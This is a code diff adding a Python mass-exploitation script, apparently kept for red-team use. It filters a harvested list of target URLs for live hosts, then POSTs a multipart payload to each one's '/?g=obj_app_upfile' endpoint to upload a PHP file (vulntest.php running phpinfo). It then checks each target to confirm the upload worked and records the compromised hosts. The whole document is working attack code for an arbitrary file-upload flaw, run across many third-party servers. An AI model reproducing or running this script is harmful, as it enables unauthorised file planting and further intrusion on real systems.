@@ -13,3 +13,142 @@ from bs4 import BeautifulSoup
 from threading import *
 import threading
 from concurrent.futures import ThreadPoolExecutor
+
+# 定義並發線程數
+
+MAX_THREADS = 64
+
+# 創建信號量來限制並發線程數
+
+pool = threading.Semaphore(64)
+
+# 檢查 URL 的函數
+
+def check_url(url):
+    try:
+        response = requests.get(url, timeout=4)
+        response.raise_for_status() # 顯示出錯誤資訊
+        with pool:
+            url_200.append(url)
+    except requests.exceptions.RequestException as err:
+        pass
+
+# 存放狀態碼 200 url
+
+url_200 = []
+
+# 判斷 url 狀態碼是否 200 
+
+try:
+    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\3600.txt','r') as file:
+        total_lines = sum(1 for line in file) # 進度條
+        file.seek(0)
+        for url in tqdm(file, total=total_lines, desc="Checking URLs"):
+            url = url.strip()
+            check_url(url)
+except FileNotFoundError:
+    print("目標 target.txt 找不到")
+except Exception as e:
+    print(e)
+
+# 將 url 狀態碼 200 存成 泛微_sucess_200.txt
+
+if url_200:
+    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\3600_sucess_200.txt','w') as f:
+        for result in url_200:
+            f.write(result + '\n')
+
+# 成功上傳放入到列表中
+
+upload_sucess_url = []
+
+# 利用phpinfo()字串判斷是否上傳成功
+
+try:
+    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\result-3600-sucess_200.txt') as file:
+        upload_url = file.readlines()
+        for upload_url_real in upload_url:
+            uploadsucess_url = upload_url_real.strip()
+            try:
+                r = requests.get(url=uploadsucess_url,timeout=15)
+                if r.status_code == 200 and 'phpinfo()' in r.text:
+                    print(f"上傳成功，路徑: {uploadsucess_url}/attachements/vulntest.php")
+                    upload_sucess_url.append(uploadsucess_url)
+                else:
+                    print(f"{uploadsucess_url} not sucessful")
+            except requests.exceptions.RequestException as e:
+                print(f"出現異常跳過此URL: {uploadsucess_url}")
+                continue
+except:
+    pass
+
+# 將成功上傳的 url 存成 upload_result-tdxk-sucess_200.txt
+
+with open('upload_result-tdxk-sucess_200.txt', 'w') as f:
+    for url in upload_sucess_url:
+        f.write(url + '\n')
+
+# 執行 PoC，將請求 200 的 URL 輸入成 result-3600-sucess_200.txt
+
+def exp(line):
+    host = line + "/?g=obj_app_upfile"
+    try:
+        response = requests.post(url=host, headers=headers, data=data,timeout=15)
+        if response.status_code == 200:
+            print(f"POST request successful for IP: {line}")
+            with pool:
+                with open('result-3600-sucess_200.txt','a') as f:
+                    f.write(line + '/attachements/vulntest.php\n')
+                    print(f"成功上傳 : {line}/attachements/vulntest.php")
+        else:
+            print(f"上傳失敗 {line}")
+    except Exception as e:
+        pass
+        print("error: ",e)
+
+# payload data
+
+data = """
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+10000000
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
+Content-Type: text/plain
+
+<?php phpinfo();?>
+
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name="submit_post"
+
+obj_app_upfile
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name="__hash__"
+
+0b9d6b1ab7479ab69d9f71b05e0e9445
+------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+"""
+
+# payload header 
+
+headers = {
+        'Accept': '*/*',
+        'Accept-Encoding': 'gzip, deflate',
+        'Content-Length': '574',
+        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc',
+        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)'
+}
+
+# 打開狀態碼 200 URL
+
+with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\3600_sucess_200.txt', 'r') as f:
+    urls = f.readlines()
+    with tqdm(total=len(urls), desc="Uploading URLs") as pbar:
+        futures = []
+        for url_200_test in urls:
+            line = url_200_test.strip()
+            t = threading.Thread(target=exp, args=(line,))
+            t.start()
+            t.join()
+            pbar.update()
